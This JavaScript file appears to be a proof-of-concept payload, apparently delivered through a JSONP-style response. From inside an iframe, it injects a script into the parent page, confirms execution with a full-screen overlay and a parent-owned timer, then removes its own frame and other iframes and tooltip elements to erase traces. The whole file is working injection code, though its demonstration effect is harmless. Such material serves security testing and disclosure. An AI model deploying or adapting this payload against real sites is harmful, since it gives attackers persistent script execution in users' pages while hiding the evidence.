/**/
(() => {
  try {
    const p = parent.document;

    // Install actual source in the parent realm.
    const script = p.createElement("script");

    script.textContent = `
      (() => {
        // Prevent duplicate installations.
        if (window.__parentPocInstalled) return;
        window.__parentPocInstalled = true;

        function createMarker() {
          let marker =
            document.getElementById("parent-poc-installed");

          if (!marker) {
            marker = document.createElement("meta");
            marker.id = "parent-poc-installed";
            marker.name = "parent-poc-installed";
            marker.content = String(Date.now());

            (document.head || document.documentElement)
              .appendChild(marker);
          }
        }

        function showProof() {
          document.getElementById("parent-control-proof")?.remove();

          const proof = document.createElement("div");
          proof.id = "parent-control-proof";

          proof.style.cssText = [
            "position:fixed",
            "inset:0",
            "z-index:2147483647",
            "display:flex",
            "flex-direction:column",
            "align-items:center",
            "justify-content:center",
            "gap:20px",
            "background:#fff",
            "color:#111",
            "font:32px system-ui,sans-serif",
            "text-align:center"
          ].join(";");

          const title = document.createElement("div");
          title.textContent =
            "Parent JavaScript execution confirmed";

          const status = document.createElement("div");
          status.style.font = "20px monospace";
          status.textContent =
            "Parent timer installed — waiting…";

          const close = document.createElement("button");
          close.textContent = "Close proof";
          close.style.cssText =
            "padding:12px 20px;font-size:18px;cursor:pointer";

          close.onclick = () => proof.remove();

          proof.append(title, status, close);
          document.body.appendChild(proof);

          // This callback is created by the parent realm.
          window.setTimeout(() => {
            status.textContent =
              "Parent-owned timer survived: " +
              new Date().toISOString();
          }, 1500);
        }

        function start() {
          createMarker();

          if (document.body) {
            showProof();
          } else {
            addEventListener("DOMContentLoaded", showProof, {
              once: true
            });
          }
        }

        start();
      })();
    `;

    (p.head || p.documentElement).appendChild(script);
    script.remove();

    /*
     * Wait until the parent-owned script confirms installation.
     * Only then remove the temporary execution frame.
     */
    let attempts = 0;

    function cleanup() {
      attempts++;

      try {
        const installed =
          p.getElementById("parent-poc-installed");

        if (installed) {
          p.querySelectorAll(
            ".fk-d-tooltip__trigger," +
            'iframe[src^="https://www.google.com/maps/embed"],' +
            'iframe[aria-hidden="true"]'
          ).forEach(element => {
            if (element !== window.frameElement) {
              element.remove();
            }
          });

          const frame = window.frameElement;
          if (frame) frame.remove();

          return;
        }
      } catch {}

      if (attempts < 100) {
        window.setTimeout(cleanup, 100);
      }
    }

    cleanup();
  } catch (error) {
    console.error("Safe parent PoC failed:", error);
  }
})();
//({"counts":{}})
